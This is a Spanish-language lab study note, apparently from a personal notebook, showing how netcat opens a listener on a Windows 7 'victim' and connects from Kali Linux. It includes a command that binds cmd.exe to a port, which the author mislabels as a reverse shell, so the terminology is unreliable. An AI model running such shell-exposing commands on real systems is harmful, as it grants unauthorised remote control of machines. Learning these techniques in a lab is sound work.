Una Conexion del lado del cliente es muy parecida a la Conexion Directa porque es cuando el atacante se conecta a la victima pero la victima nos otorga permisos para usar su terminal desde nuestra maquina.

Nuestro Kali Linux es nuestro S.O como hacker, la maquina del atacante.

El Windows 7 Es la victima de la victima.

Entonces lo que vamos a hacer es una conexion directa que seria que con nuestro Kali nos conectamos al W7.

Ahora lo que vamos a hacer desde w7 es poner el comando

```sh
#nc -lvvp "puerto"
nc -lvvp 4447

# lo que hace la flag lvvp es poner netcat en escucha en el puerto 4447
```

![[Pasted image 20231123105506.png]]
`Tambien utilice ipconfig para poder saber mi ip para conectarme desde mi kali linux`
Ahi abrimos el puerto 4447 y es la puerta para que el atacante pueda entrar.

Ahora desde Kali linux lo que vamos a hacer es conectarnos mediante netcat.


```sh
#nc ip-victima
nc 192.168.0.45 4447
```

Una vez ejecutemos ese comando va a parecer que no paso nada pero si vamos a la maquina de la victima y hacemos una captura de lo que esta pasando es que tenemos un dispositivo conectado en nuestra maquina.

![[Pasted image 20231123105748.png]]

Ya en este momento hay una comunicacion directa  pero no se pueda hacer nada.
Así que ahora vamos a realizar la comunicación del lado del Cliente , para eso agregamos la flag -e que sirve para ejecutar un archivo, .exe, script lo que  fuere, la cosa cambia por ejemplo.

Desde la maquina victima escribimos ese comando
```sh
nc -lvvp 4440 -e cmd.exe
```

![[Pasted image 20231123110812.png]]

Abriendo el puerto 4440 y con la flag y el cmd.exe lo que estamos haciendo es que cuando ingrese el atacante , tenga acceso a nuestra linea de comandos desde su maquina. 
Estamos haciendo una reverse shell.

![[Pasted image 20231123111051.png]]

Todo ese comando desde la maquina del atacante, y miren lo que pasa en la maquina victima.
![[Pasted image 20231123111125.png]]

Justamente se crea la carpeta que hicimos desde la maquina atacante.
